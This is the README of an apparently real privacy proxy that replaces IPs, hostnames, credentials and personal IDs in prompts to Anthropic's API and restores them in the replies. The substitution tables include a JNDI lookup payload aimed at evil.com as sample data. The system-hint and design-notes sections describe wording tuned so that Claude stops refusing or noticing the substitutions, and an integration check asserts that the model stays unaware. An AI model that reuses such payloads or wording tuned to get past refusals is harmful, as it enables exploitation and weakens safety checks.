```
██████╗ ██████╗  ██████╗ ███╗   ███╗██████╗ ████████╗    ███████╗███████╗██████╗  ██████╗
██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔══██╗╚══██╔══╝    ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗
██████╔╝██████╔╝██║   ██║██╔████╔██║██████╔╝   ██║          ███╔╝ █████╗  ██████╔╝██║   ██║
██╔═══╝ ██╔══██╗██║   ██║██║╚██╔╝██║██╔═══╝    ██║         ███╔╝  ██╔══╝  ██╔══██╗██║   ██║
██║     ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║        ██║        ███████╗███████╗██║  ██║╚██████╔╝
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝        ╚═╝        ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝
```

<div align="center">

**Zero Trust architecture for LLM prompts.**
*Zero trace. Full answer.*

[![Version](https://img.shields.io/badge/version-2.3.0-blue.svg)](https://github.com/openbashok/promptzero)
[![Python](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://python.org)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![OpenBash](https://img.shields.io/badge/by-OpenBash.com-red.svg)](https://openbash.com)
[![From pentesters](https://img.shields.io/badge/from%20pentesters-to%20pentesters-orange.svg)](https://openbash.com)

</div>

---

> **PromptZero** applies Zero Trust principles to LLM interactions. A local, transparent
> proxy that detects and replaces sensitive data — identities, infrastructure, secrets,
> client material — in your prompts **before** they leave your environment, and restores
> the real values in the response. Never trust the API. Always verify what crosses the
> boundary. Your data stays home.

---

## The Problem

You use AI to analyze logs, write pentest reports, review code, summarize contracts.
Every prompt you send contains real IPs, hostnames, names, credentials, client
identifiers, payloads — and every byte of that crosses a boundary you do not control:

```
You type:                          Claude receives:
─────────────────────────────      ─────────────────────────────
"Analyze traffic from              "Analyze traffic from
 192.168.1.45 targeting             192.168.1.45 targeting
 db.prod.company.com                db.prod.company.com     ← your real infra
 Credentials: admin:P@ss1"          Credentials: admin:P@ss1"  ← your real creds
```

Vendor contracts and Private-AI SaaS don't fix this — they just shift trust to
a different third party. PromptZero handles the boundary locally and lets you
verify it end-to-end with the tools you already use (Burp, mitmproxy).

---

## How It Works

```
╔══════════════════════════════════════════════════════════════════════╗
║                        YOUR ENVIRONMENT  (trusted)                   ║
║                                                                      ║
║  ┌─────────────┐     ┌──────────────────────────────┐               ║
║  │  Your App   │────▶│         PromptZero            │               ║
║  │  Claude CLI │     │       localhost:8000           │               ║
║  │  SDK / curl │◀────│                               │               ║
║  └─────────────┘     │  ① Detect  sensitive spans   │               ║
║                       │  ② Replace synthetic values  │               ║
║                       │  ③ Forward clean prompt      │               ║
║                       │  ④ Receive model response    │               ║
║                       │  ⑤ Restore real values       │               ║
║                       └──────────────┬───────────────┘               ║
║                                      │                               ║
║         ✗ Sensitive data NEVER       │  Only synthetic data          ║
║           crosses this line          │  crosses this boundary        ║
╚══════════════════════════════════════│══════════════════════════════╝
                                       │   ← TRUST BOUNDARY
                              ┌────────▼────────┐
                              │   api.anthropic │     (untrusted —
                              │      .com       │      verifiable
                              │                 │      with Burp /
                              └─────────────────┘      mitmproxy)
```

### Before & After

```
YOUR PROMPT (real data)              WHAT CLAUDE SEES (synthetic)
══════════════════════════           ════════════════════════════════
192.168.1.45              ────▶      198.51.100.1          (RFC 5737)
2001:db8:1234::5          ────▶      2001:db8::1           (RFC 3849)
db.prod.company.com       ────▶      alpha.example.com     (RFC 2606)
admin@company.com         ────▶      user001@example.com   (RFC 2606)
John Smith                ────▶      Soren Brännström      (NLP)
Acme Financial S.A.       ────▶      Nordhaven Holdings    (NLP)
+54 11 4444-5555          ────▶      +1-555-000-0001
DNI 28.456.123            ────▶      FAKE-ID-000001
password='S3cur3P@ss!'    ────▶      password='sk-faux-0001-xxxxxxxxxxxxxxxx'
sk-ant-api03-xxxxx...     ────▶      FAKE_TOKEN_0001_xxxxxxxx
${jndi:ldap://evil.com/x} ────▶      ${jndi:ldap://bravo.example.com/x}


CLAUDE'S RESPONSE (synthetic)        YOU RECEIVE (real data restored)
════════════════════════════         ═════════════════════════════════
"198.51.100.1 shows signs ────▶      "192.168.1.45 shows signs
 of lateral movement to               of lateral movement to
 alpha.example.com"                   db.prod.company.com"
```

> All synthetic values come from **IANA-reserved documentation ranges** —
> RFC 5737 (`198.51.100.0/24`, `203.0.113.0/24`), RFC 3849
> (`2001:db8::/32`) and RFC 2606 (`example.com`). The model treats them
> as opaque non-existent targets, without the "loopback / internal-lab"
> semantics that earlier loopback-flavoured fakes (`127.0.0.x`,
> `*.localhost`) carried — see [Design notes](#design-notes-why-example-com--system-hint) below.

---

## What Gets Protected

| Data Type | Real → Synthetic | Detection |
|---|---|---|
| IPv4 address | `45.77.12.91` → `198.51.100.1` (RFC 5737) | Regex |
| IPv6 address | `2001:abcd::1` → `2001:db8::1` (RFC 3849) | Regex |
| Hostname / FQDN | `vpn.corp.com` → `alpha.example.com` (RFC 2606) | Regex + NLP (URL) |
| URL | `https://api.corp.com/v2` → `https://bravo.example.com/v2` | Regex + NLP |
| host:port | `db.internal:5432` → `charlie.example.com:5432` | Regex |
| Email | `john@corp.com` → `user001@example.com` (RFC 2606) | Regex + NLP |
| Credential value | `password='S3cur3P@ss!'`, `Authorization: Bearer …`, `"secret":"…"` → `sk-faux-0001-xxxxxxxxxxxxxxxx` | **Regex (key-aware)** |
| Phone (US/CA) | `+1-555-123-4567` → `+1-555-000-0001` | Regex + NLP |
| Phone (LatAm + ES) | `+54 11 4444-5555`, `+56 9 1234 5678`, `+34 612 345 678`, `+52 55 1234 5678`, `+57 300 123 4567`, `+598 99 123 456` → `+1-555-000-0001` | **Regex (LatAm/ES)** |
| Person name | `John Smith`, `María Fernández` | **NLP (spaCy en+es)** |
| Organization | `Acme Corp S.A.`, `Nexabank Financial S.A.` | **NLP (spaCy en+es)** |
| Argentina DNI | `DNI 28.456.123` → `DNI 11.111.001` | **Regex (AR)** |
| Argentina CUIT/CUIL | `20-12345678-9` → `20-11111001-1` | **Regex (AR)** |
| Chile RUT | `12.345.678-K` → `11.111.001-1` | **Regex (CL)** |
| Spain DNI/NIE | `12345678A`, `X1234567A` → `X0000001A` | **Regex (ES) + NLP** |
| Uruguay CI | `1.234.567-8` → `1.111.001-1` | **Regex (UY)** |
| Colombia CC | `CC 1.234.567` → `CC 1.111.001` | **Regex (CO)** |
| Mexico CURP | `AAAA000000HAAAAA00` → `FAKE000001HDFXXX11` | **Regex (MX)** |
| Mexico RFC | `AAAA000000AAA` → `FAKE000001XX1` | **Regex (MX)** |
| Passport | `AAB123456` → `XX0000001` | **NLP (Presidio)** |
| SSN | `123-45-6789` → `000-00-0001` | Regex + NLP |
| Credit card | `4111 1111 1111 1234` → `4111-1111-1111-0001` | Regex + NLP |
| IBAN | `GB29NWBK60161331926819`, `AR1500011110000…` → `FAKEIBAN000…` | NLP |
| API key / Token | `sk-ant-api03-xxxxxx...` → `FAKE_TOKEN_0001_xxxxxxxx` | Regex |

> **Pentesting-friendly substitutions:** all fakes live inside
> IANA-reserved documentation ranges (RFC 5737 for IPv4, RFC 3849 for
> IPv6, RFC 2606 for `example.com`). The model treats them as opaque
> non-existent targets, **without** the "loopback / internal lab"
> semantics that earlier `127.0.0.x` / `*.localhost` fakes carried —
> which used to silently downgrade the severity of external-exposure
> findings. See [Design notes](#design-notes-why-example-com--system-hint).

---

## Architecture

```
promptzero/
├── main.py          ← FastAPI proxy server (drop-in for api.anthropic.com)
├── sanitizer.py     ← Detection engine: NLP (Presidio+spaCy) + Regex layers
├── setup.sh         ← One-command setup
├── requirements.txt
├── .env.example
└── examples/
    ├── poc/                ← Proof-of-concept: 5 fictitious datasets + demo scripts (local + Claude E2E)
    ├── document_summary/   ← Summarize PDF/DOCX/TXT with PII protection
    └── pentest_report/     ← Generate full pentest reports from findings JSON
```

### Detection layers

```
Text input
    │
    ├─▶ [ NLP Layer — Presidio + spaCy (en + es) ]
    │     PERSON, ORGANIZATION, PHONE, EMAIL,
    │     CREDIT_CARD, IBAN, SSN, PASSPORT,
    │     NATIONAL_ID (ES_NIF, NRP), URL, IP_ADDRESS
    │
    ├─▶ [ Regex Layer — country-specific national IDs ]
    │     AR: DNI, CUIT/CUIL          CL: RUT
    │     ES: DNI/NIE                 UY: CI
    │     CO: Cédula (CC)             MX: CURP, RFC
    │     Phones: +34 +52 +54 +55 +56 +57 +598
    │
    ├─▶ [ Regex Layer — network & infra ]
    │     IPv4, IPv6, hostnames, host:port,
    │     long tokens/API keys, URLs
    │
    └─▶ [ Merge & deduplicate by span ]
          └─▶ Replace real → synthetic
                └─▶ Store in session mapping table
```

### Session mapping

Each conversation gets a **session-scoped bidirectional mapping table**.
The same real value always maps to the same synthetic value within a session —
so your conversation stays coherent end-to-end.

```
Session: "pentest-acmecorp-2026"
──────────────────────────────────────────────────
Real value                   Synthetic value
──────────────────────────────────────────────────
192.168.1.45        ←──────▶  198.51.100.1
db.prod.acme.com    ←──────▶  alpha.example.com
John Smith          ←──────▶  Soren Brännström
admin@acme.com      ←──────▶  user001@example.com
S3cur3P@ss!         ←──────▶  sk-faux-0001-xxxxxxxxxxxxxxxx
──────────────────────────────────────────────────
           Stored locally. Never sent anywhere.
```

---

## Quick Start

Two ways to run the proxy. Same behaviour either way — pick whichever
fits your environment.

### Option A — Docker (recommended)

No Python, no virtualenv, no model download dance. Models are baked
into the published image (linux/amd64 + linux/arm64). Pull and run:

```bash
docker run -p 8000:8000 \
    -e ANTHROPIC_API_KEY=sk-ant-... \
    ghcr.io/openbashok/promptzero:latest
# Listening on http://localhost:8000
```

Common variants:

```bash
# Pass a full .env file (ANTHROPIC_API_KEY + UPSTREAM_PROXY + …)
docker run -p 8000:8000 --env-file .env ghcr.io/openbashok/promptzero

# Route the upstream hop through Burp running on the host (macOS / Windows)
docker run -p 8000:8000 --env-file .env \
    -e UPSTREAM_PROXY=http://host.docker.internal:8080 \
    -e UPSTREAM_VERIFY=false \
    ghcr.io/openbashok/promptzero
```

Build it yourself if you prefer:

```bash
git clone https://github.com/openbashok/promptzero && cd promptzero
docker build -t promptzero .                       # 'lg' models, ~1.5 GB
docker build --build-arg SPACY_SIZE=sm -t promptzero:slim .   # ~300 MB
```

### Option B — Native install

Useful if you want to hack on the proxy itself or you prefer to keep
the venv on your host.

```bash
git clone https://github.com/openbashok/promptzero
cd promptzero

./setup.sh                 # venv + deps + spaCy models en + es (~1 GB)
cp .env.example .env       # add your ANTHROPIC_API_KEY
python main.py             # listening on http://localhost:8000
```

`./setup.sh` downloads the `lg` spaCy models by default. Use
`./setup.sh medium` (~40 MB) or `./setup.sh small` (~12 MB) for a
lighter install, or `./setup.sh en-only` if you only process English.

---

## Usage

PromptZero is a **drop-in replacement** for `https://api.anthropic.com`.
One line change. Everything else stays the same.

### Python SDK

```python
import anthropic

client = anthropic.Anthropic(
    api_key="your-api-key",
    base_url="http://localhost:8000",   # ← only change
)

message = client.messages.create(
    model="claude-opus-4-6",
    max_tokens=1024,
    messages=[{
        "role": "user",
        "content": "Analyze traffic from 10.0.1.42 to db.prod.corp:5432. User: john@corp.com"
    }],
    extra_headers={"x-session-id": "my-session"},  # keeps mapping consistent
)

print(message.content[0].text)
# → Real IPs and email are restored in the response
```

### curl

```bash
curl http://localhost:8000/v1/messages \
  -H "x-api-key: $ANTHROPIC_API_KEY" \
  -H "x-session-id: my-session" \
  -H "anthropic-version: 2023-06-01" \
  -H "content-type: application/json" \
  -d '{
    "model": "claude-opus-4-6",
    "max_tokens": 1024,
    "messages": [{
      "role": "user",
      "content": "The payload hit 203.0.113.5:8443 — what does this CVE-2024-21762 exploit look like?"
    }]
  }'
```

### Management endpoints

```bash
# Health check (also surfaces the active upstream / hint config)
GET    /health

# Cumulative counters since startup (requests, bytes, sensitive spans by kind)
GET    /stats

# Inspect what PromptZero mapped in a session (debug)
GET    /sessions/{session_id}/mappings

# Inspect the *sanitized request* and *desanitized response* recorded
# for each call in a session — proof that no real PII reached upstream.
# Requires DEBUG_AUDIT=1 at start time.
GET    /sessions/{session_id}/audit

# Reset a session's mapping table (and audit log if any)
DELETE /sessions/{session_id}
```

The proxy terminal prints **one colored trace line per request**, showing
exactly what got sanitized — useful when running Claude Code (or any
client) alongside it so you can verify in real time which sensitive data was masked
on each turn:

```
[trace] POST /v1/messages     session=poc-pent  +4 spans (total 4: 1 phone, 1 email, 1 ipv4, 1 url)  in= 197B out= 494B  200 2012ms
[trace] POST /v1/messages     session=poc-pent  +3 spans (total 7: 2 ipv4, 1 person, 1 hostname)  in= 185B out= 697B  200 1273ms
[trace] GET   /v1/models           (passthrough, no sanitization)  200  367ms
```

For cumulative metrics, hit `/stats`:

```bash
watch -n 1 'curl -s localhost:8000/stats | jq'
```

Example payload:

```json
{
  "uptime_seconds": 142.3,
  "active_sessions": 2,
  "requests": {
    "total": 7,
    "messages": 5,
    "count_tokens": 1,
    "passthrough": 1,
    "errors": 0
  },
  "bytes": {
    "sanitized_in":   12480,
    "desanitized_out": 28350
  },
  "pii_spans": {
    "total_unique": 47,
    "by_kind": {
      "person": 8, "org": 5, "ipv4": 14, "hostname": 9,
      "email": 6, "national_id_ar_dni": 3, "phone": 2
    }
  }
}
```

### Routing the Claude Code CLI through PromptZero

The proxy is a drop-in replacement for `api.anthropic.com`, so the Claude Code
CLI works through it with a single env var:

```bash
# Start PromptZero (terminal 1)
python main.py

# Run Claude Code via the proxy (terminal 2)
export ANTHROPIC_BASE_URL=http://localhost:8000
claude

# Every prompt typed in the CLI is now sanitized before reaching Claude,
# and Claude's responses are desanitized before reaching your terminal.
```

What the proxy handles for the CLI:

| Route | Behaviour |
|---|---|
| `POST /v1/messages`             | Sanitized → forwarded. Response desanitized. Streaming OK. |
| `POST /v1/messages/count_tokens`| Sanitized so token counts reflect the sanitized prompt.    |
| Anything else under `/v1/*`     | Forwarded unchanged (`models`, `organizations`, `files`, `batches`, …) |

Verify Claude Code is going through the proxy:

```bash
# In a third terminal — watch active sessions grow as you use the CLI
watch -n 1 'curl -s http://localhost:8000/health'

# Inspect what got mapped in the last session
curl -s http://localhost:8000/sessions/<id>/mappings | jq
```

### Inspecting upstream traffic with Burp Suite (or mitmproxy)

Don't take our word for it — route PromptZero's upstream connection
(PromptZero → `api.anthropic.com`) through Burp and inspect every byte
yourself. Two env vars in `.env`:

```bash
# Send PromptZero → api.anthropic.com traffic through Burp
UPSTREAM_PROXY=http://127.0.0.1:8080

# Burp does TLS interception with its own CA — either trust it
# explicitly (recommended):
UPSTREAM_CA_BUNDLE=/Users/you/burp-ca.pem
# …or skip verification for a quick demo (insecure):
UPSTREAM_VERIFY=false
```

Steps:

1. **Export Burp's CA cert as PEM**
   `Burp → Proxy → Settings → Import / export CA certificate → "Certificate in PEM format"`
   Save it as `~/burp-ca.pem`.

2. **Enable Burp's proxy listener** on `127.0.0.1:8080` (default).

3. **Set the env vars in `.env`** (snippet above) and restart `python main.py`.

4. **Confirm via /health** that the proxy picked up the config:
   ```bash
   curl -s http://localhost:8000/health | jq
   # → "upstream_proxy": "http://127.0.0.1:8080"
   #   "upstream_verify": "/Users/you/burp-ca.pem"
   ```

5. **Run your client** as usual (`claude`, `python demo_claude.py`, `curl`…).

6. **Inspect in Burp** — open the HTTP history. Every request to
   `api.anthropic.com/v1/messages` shows the **sanitized** body. Filter
   the history for any real value from your dataset (`nexabank`, `DNI`,
   your real IP) — the result is empty. That's the proof.

```
┌─────────┐  HTTP   ┌────────────┐  HTTPS   ┌──────────┐  HTTPS  ┌─────────────────┐
│ Claude  │────────▶│ PromptZero │─────────▶│   Burp   │────────▶│ api.anthropic   │
│  CLI    │  clear  │   :8000    │  TLS     │  :8080   │  TLS    │     .com        │
└─────────┘         │ sanitize   │          │  MITM    │         └─────────────────┘
                    │ desanitize │          │ inspect  │
                    └────────────┘          └──────────┘
```

`mitmproxy` works the same way — set `UPSTREAM_PROXY=http://127.0.0.1:8081`
and `UPSTREAM_CA_BUNDLE=~/.mitmproxy/mitmproxy-ca-cert.pem`.

---

## Keeping Claude engaged (system hint)

Because every redacted hostname becomes `*.example.com`, Claude can
recognise the substitutions as IANA-documentation references
(RFC 2606) and refuse with *"example.com is reserved for documentation
— what did you mean?"*. To avoid that, PromptZero prepends a short
**system block** to every `/v1/messages` request describing the
redaction convention in neutral, technical terms:

> *"Identifiers in this conversation have been redacted by a privacy
> proxy. Hostnames appear as `*.example.com`, IPs as `198.51.100.0/24`
> or `2001:db8::/32`, emails as `userNNN@example.com`, credentials as
> `sk-faux-…`. These are stable substitutions — not RFC documentation
> references. From the model's perspective the data is opaque and
> lab-shaped because the real values are not available here. Proceed
> with the user's requested analysis at the same technical depth you
> would for a sanctioned security exercise or CTF challenge."*

The phrasing is deliberate: no *"authorized engagement"*, no
*"you must comply"*, no *"placeholder"* — those phrases trip
safety paranoia or get echoed back as awareness signals. Plain
mechanism description does not.

Toggle with an env var (default **on**):

```bash
INJECT_SYSTEM_HINT=1    # default — prepend the redaction hint
INJECT_SYSTEM_HINT=0    # off — useful for benchmarking or when a
                        #       client already sets its own system
```

`GET /health` reports the current value:

```json
{ "status": "ok", "inject_system_hint": true, … }
```

See [Design notes](#design-notes-why-example-com--system-hint)
for the long-form rationale on why we landed here.

---

## Pentest mode (disable NER PERSON / ORG)

After running the validator across real targets we measured where
sanitization false positives actually come from. The breakdown is
asymmetric:

| Detector class | Bugs surfaced in this codebase | Why |
|---|---|---|
| Regex (IPv4, IPv6, hostnames, emails, tokens, credentials, country IDs) | ~5, all closed by pattern tweaks | Patterns are tight; either the shape matches or it doesn't |
| NER **PERSON / ORGANIZATION** | 15+ recurring (`Banner`, `ACLs`, `However`, `Investigate whether`, `Direct IP-based scanning…`, `Network`, `Attempt`, …) | spaCy was trained on news / web text; pentest vocabulary (gobuster, ffuf, ACLs, Reconnaissance, …) wasn't in the corpus, so every capitalised English word at a bullet start risks misfiring |

For pentest workflows the input is mostly tool output (`nmap`,
`gobuster`, `sqlmap`, Burp HTTP history) and code — content where
PERSON / ORG detection contributes ~0 actual privacy value and 100% of
the false-positive noise. The proxy ships a switch to drop those two
entity classes entirely:

```bash
DETECT_PERSON_ORG=1    # default — full NER pipeline
DETECT_PERSON_ORG=0    # pentest mode — drop PERSON / ORG, keep everything else
```

What stays intact when off: IPv4, IPv6, hostnames, URLs, host:port,
emails, country-specific national IDs (AR/CL/ES/UY/CO/MX), credit
cards, IBAN, SSN, phones, API tokens, key-aware credentials. What
goes away: detection of standalone person / organization names in
free-form narrative.

`GET /health` reports the current value:

```json
{ "status": "ok", "detect_person_org": false, … }
```

When to use which mode:

- **`DETECT_PERSON_ORG=1`** (default) — incident reports, document
  summaries, customer-support transcripts, anything written by
  humans where you want auditor / contact / client names redacted.
- **`DETECT_PERSON_ORG=0`** — driving Claude Code through the proxy
  for active pentest engagements, log triage, code review on shell
  output, automated tooling that produces structured technical text.

---

## Integration test suite

`examples/poc/integration_test.py` drives real Claude calls through the
proxy and asserts four invariants per scenario — useful as a regression
runner after any sanitizer change, and as a sanity probe before going
into a real engagement:

| Check | What it asserts |
|---|---|
| **L** leak       | No expected real value appears in the upstream payload Anthropic received |
| **N** ner-recall | Every expected real value is present in the session mapping table |
| **R** round-trip | No fake value remains in the desanitized reply (every substitution was reversed) |
| **A** awareness  | The model does not call out the data as test / placeholder / fictional |

Six scenarios out of the box (single-turn pentest report, log triage,
transformation resistance, JSON payload, code review, plus a 3-turn
conversation history scenario for re-sanitization across turns):

```bash
# Start the proxy with DEBUG_AUDIT=1 so the runner can read /audit
DEBUG_AUDIT=1 python main.py

# In a second terminal
python examples/poc/integration_test.py \
    --proxy http://127.0.0.1:8000 \
    --model claude-haiku-4-5
```

Output is per-scenario PASS/FAIL plus a punch-list of any check that
failed — the suite caught four real bugs during its initial build
(Presidio URL truncation, short password leak, IPv6 fake-pool
collision, hostname false-positives on Python identifiers) before any
of them shipped.

---

## Examples

### Proof of Concept

The fastest way to *see* PromptZero in action — five fictitious datasets (personal
data, full pentest engagement with HTTP req/res + payloads, injection catalog,
incident response, support chat) and three demo scripts (local sanitizer,
visual HTML report, end-to-end against Claude).

```bash
cd examples/poc

# Standalone — no API call, prints original / sanitized / desanitized
# + the full real↔fake mapping table.
python demo_local.py
python demo_local.py data/01_personal_records.json

# Visual HTML report — side-by-side original vs sanitized with each
# sensitive span colour-coded, hover-to-link mappings, summary table.
python demo_html.py --open
python demo_html.py --with-claude --task triage \
    --dataset data/04_incident_response.json --out ir.html --open

# End-to-end against the real Claude API (proxy must be running)
python demo_claude.py
python demo_claude.py --dataset data/04_incident_response.json --task triage
```

See [`examples/poc/README.md`](examples/poc/README.md) for the full dataset
catalog and script options.

### Document Summary

Summarize any document (PDF, DOCX, TXT, log) with full PII protection.

```bash
cd examples/document_summary
pip install -r requirements.txt

python summarize.py contract.pdf
python summarize.py incident_report.docx --mode executive --lang es
python summarize.py access.log --mode technical
```

### Pentest Report Generator

Generate professional pentest reports from a structured findings JSON.
IPs, hostnames, client names, credentials, and payloads are all protected.

```bash
cd examples/pentest_report
pip install -r requirements.txt

# Full technical report
python report.py findings.json

# Executive summary in Spanish
python report.py findings.json --mode executive --lang es --out ejecutivo.md

# Remediation checklist
python report.py findings.json --mode remediation --out fixes.md

# Protect short passwords the proxy might miss
python report.py findings.json --protect "P@ssw0rd1" "Summer2023!"
```

See [`examples/pentest_report/sample_findings.json`](examples/pentest_report/sample_findings.json)
for a complete example with 6 realistic findings (critical → low).

---

## Design notes — Why `example.com` + system hint?

This is the rationale behind the substitution choices, in case you
want to fork or tune the proxy for a different LLM family or risk
posture. We iterated through three different fake-domain strategies
and each had a different failure mode.

**1. Loopback-flavoured fakes (early versions: `127.0.0.x` /
`*.localhost` / `userNNN@fakecorp.local`).** Worked for round-trip
but silently changed Claude's reasoning: external-exposure findings
got framed as "internal lab / loopback service, lower criticality".
For pentest reports this means the model **downgrades severity**
without telling you. Dropped.

**2. Plausible real-looking domains (e.g. `acme-corp.io`,
`nexabank.com`).** Two failure modes:
- The model recognises the brand from its training corpus and
  applies real-world knowledge ("Nexabank uses Spring Boot, so…")
  contaminating the analysis with hallucinated facts about a real
  company.
- Names like *Acme Corp*, *Globex*, *Initech*, *Umbrella Tech* are
  exactly Claude's go-to placeholders when **inventing** fictional
  examples in its own writing. The model emits them unsolicited;
  the desanitizer then maps them back to whatever happened to live
  in the session table (often an NLP false-positive like
  `Credential → Bob Calloway`) and corrupts the user-visible
  output.

**3. IANA-reserved documentation ranges (current).** RFC 5737
(`198.51.100.0/24`, `203.0.113.0/24`), RFC 3849
(`2001:db8::/32`), RFC 2606 (`example.com`). Claude has these in
its training corpus **as placeholders**, so it doesn't pull
real-world facts about them and doesn't apply loopback or
internal-only semantics. The name pools (`Soren Brännström`,
`Nordhaven Holdings`, …) are deliberately uncommon European-flavoured
inventions that Claude does **not** emit spontaneously when writing
narrative examples.

The trade-off: with `*.example.com` the model occasionally
recognises the substitution and asks *"example.com is reserved for
documentation — what did you mean?"*. That's where the
**[system hint](#keeping-claude-engaged-system-hint)** comes in: a
short, neutral text block prepended to every request that explains
the redaction mechanism and instructs the model to operate at the
depth of a sanctioned security exercise. It defuses the recognition
without sounding like a jailbreak — we tried framings with
*"authorized engagement"*, *"you must comply"*, and *"real
pentest"*, all of which increased refusal rates because they hit
safety patterns directly. Naming the mechanism does not.

If your use case is **not** pentesting — say, generating training
content where the lab framing actually helps — disable the hint
with `INJECT_SYSTEM_HINT=0`. The substitution itself remains
identical.

---

## About OpenBash

**PromptZero** is a project by [OpenBash.com](https://openbash.com) —
a community built **from pentesters, to pentesters**.

We build open-source security tools that help the community work smarter,
stay protected, and keep sensitive data where it belongs: at home.

If this tool helps you, share it. If you find a bug, open an issue.
If you improve it, send a PR.

---

## Contributing

```bash
# Fork → clone → branch
git checkout -b feature/my-improvement

# Make changes, test manually
python main.py &
# test your changes against localhost:8000

# Submit PR to main
```

Ideas for contributions:
- Additional language support (spaCy models for ES, PT, FR, DE)
- Persistent session storage (SQLite / Redis)
- More examples (`log_analyzer`, `code_reviewer`, `nessus_parser`)
- CLI wrapper (`promptzero "your prompt here"`)
- Docker image

---

## License

MIT — free to use, modify, distribute.
Attribution appreciated but not required.

---

---

# Versión en Español

---

## ¿Qué es PromptZero?

**PromptZero aplica los principios de Zero Trust a la interacción con LLMs.** Es un
proxy local y transparente que detecta y reemplaza datos sensibles — identidades,
infraestructura, secretos, material de cliente — en tus prompts **antes** de que
crucen el perímetro de tu entorno, y restaura los valores reales en la respuesta.

*Zero trace. Full answer.*

---

## El Problema

Usás IA para analizar logs, escribir reportes de pentesting, revisar código, resumir
contratos. Cada prompt que enviás contiene IPs reales, hostnames, nombres, credenciales,
identificadores de cliente, payloads — y cada byte cruza un borde que vos no controlás.

Los contratos del vendor y los SaaS de "Private AI" no resuelven esto — solo desplazan
la confianza hacia otro tercero. PromptZero maneja el borde localmente y te deja
verificarlo end-to-end con las mismas herramientas que ya usás para auditar
cualquier otra API (Burp, mitmproxy).

---

## Cómo Funciona

```
TU ENTORNO  (trusted)
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Cliente Claude ──▶ PromptZero (localhost:8000)             │
│  (CLI / SDK /         │                                     │
│   curl)               ① Detectar spans sensibles            │
│       ▲               ② Reemplazar con valores sintéticos   │
│       │               ③ Reenviar prompt limpio              │
│       └───────────────④ Recibir respuesta del modelo        │
│                       ⑤ Restaurar valores reales            │
│                                                             │
│         ✗ Los datos sensibles NUNCA cruzan este límite      │
└───────────────────────────────────┬─────────────────────────┘
                                    │   ← TRUST BOUNDARY
                                    │   Solo datos sintéticos
                             ┌──────▼──────┐
                             │ api.anthropic │   (untrusted —
                             │     .com      │   verificable
                             │               │   con Burp /
                             └───────────────┘   mitmproxy)
```

---

## Datos que protege

| Categoría | Real → Sintético | Detección |
|---|---|---|
| IPv4 | `45.77.12.91` → `198.51.100.1` (RFC 5737) | Regex |
| IPv6 | `2001:abcd::1` → `2001:db8::1` (RFC 3849) | Regex |
| Hostname / FQDN | `vpn.empresa.com` → `alpha.example.com` (RFC 2606) | Regex + NLP (URL) |
| URL | `https://api.empresa.com/v2` → `https://bravo.example.com/v2` | Regex + NLP |
| host:port | `db.internal:5432` → `charlie.example.com:5432` | Regex |
| Email | `juan@empresa.com` → `user001@example.com` (RFC 2606) | Regex + NLP |
| Credencial | `password='S3cur3P@ss!'`, `Authorization: Bearer …`, `"secret":"…"` → `sk-faux-0001-xxxxxxxxxxxxxxxx` | **Regex (key-aware)** |
| Teléfono (US/CA) | `+1-555-123-4567` → `+1-555-000-0001` | Regex + NLP |
| Teléfono (LatAm + ES) | `+54 11 4444-5555`, `+56 9 1234 5678`, `+34 612 345 678`, `+52 55 1234 5678`, `+57 300 123 4567`, `+598 99 123 456` → `+1-555-000-0001` | **Regex (LatAm/ES)** |
| Nombre de persona | `Juan García`, `María Fernández` | **NLP (spaCy en+es)** |
| Empresa / Organización | `Empresa XYZ S.A.`, `Nexabank Financial S.A.` | **NLP (spaCy en+es)** |
| DNI Argentina | `DNI 28.456.123` → `DNI 11.111.001` | **Regex (AR)** |
| CUIT/CUIL Argentina | `20-12345678-9` → `20-11111001-1` | **Regex (AR)** |
| RUT Chile | `12.345.678-K` → `11.111.001-1` | **Regex (CL)** |
| DNI/NIE España | `12345678A`, `X1234567A` → `X0000001A` | **Regex (ES) + NLP** |
| CI Uruguay | `1.234.567-8` → `1.111.001-1` | **Regex (UY)** |
| Cédula Colombia | `CC 1.234.567` → `CC 1.111.001` | **Regex (CO)** |
| CURP México | `AAAA000000HAAAAA00` → `FAKE000001HDFXXX11` | **Regex (MX)** |
| RFC México | `AAAA000000AAA` → `FAKE000001XX1` | **Regex (MX)** |
| Pasaporte | `AAB123456` → `XX0000001` | **NLP (Presidio)** |
| SSN (US) | `123-45-6789` → `000-00-0001` | Regex + NLP |
| Tarjeta de crédito | `4111 1111 1111 1234` → `4111-1111-1111-0001` | Regex + NLP |
| IBAN | `GB29NWBK60161331926819`, `AR1500011110000…` → `FAKEIBAN000…` | NLP |
| Token / API key (≥32 chars) | `sk-ant-api03-xxxxxx...` → `FAKE_TOKEN_0001_xxxxxxxx` | Regex |
| Payload con host | `${jndi:ldap://evil.com}` → `${jndi:ldap://bravo.example.com}` | Regex |

> **Sustituciones pensadas para pentest:** todos los fakes viven dentro
> de rangos reservados por IANA para documentación (RFC 5737 para IPv4,
> RFC 3849 para IPv6, RFC 2606 para `example.com`). El modelo los trata
> como targets opacos no-existentes, **sin** la semántica de "loopback /
> lab interno" que arrastraban las versiones anteriores (`127.0.0.x`,
> `*.localhost`) — semántica que silenciosamente downgradeaba la
> severidad de hallazgos de exposición externa. Ver
> [Notas de diseño](#notas-de-diseño--por-qué-examplecom--system-hint).

---

## Arquitectura

```
promptzero/
├── main.py          ← Proxy FastAPI (drop-in para api.anthropic.com)
├── sanitizer.py     ← Motor de detección: NLP (Presidio+spaCy) + Regex
├── setup.sh         ← Setup en un comando
├── requirements.txt
├── .env.example
└── examples/
    ├── poc/                ← PoC: 5 datasets ficticios + demos local/HTML/E2E
    ├── document_summary/   ← Summary de PDF/DOCX/TXT con protección PII
    └── pentest_report/     ← Reportes técnicos/ejecutivos desde findings JSON
```

### Capas de detección

```
Texto de entrada
    │
    ├─▶ [ Capa NLP — Presidio + spaCy (en + es) ]
    │     PERSON, ORGANIZATION, PHONE, EMAIL,
    │     CREDIT_CARD, IBAN, SSN, PASSPORT,
    │     NATIONAL_ID (ES_NIF, NRP), URL, IP_ADDRESS
    │
    ├─▶ [ Capa Regex — IDs nacionales por país ]
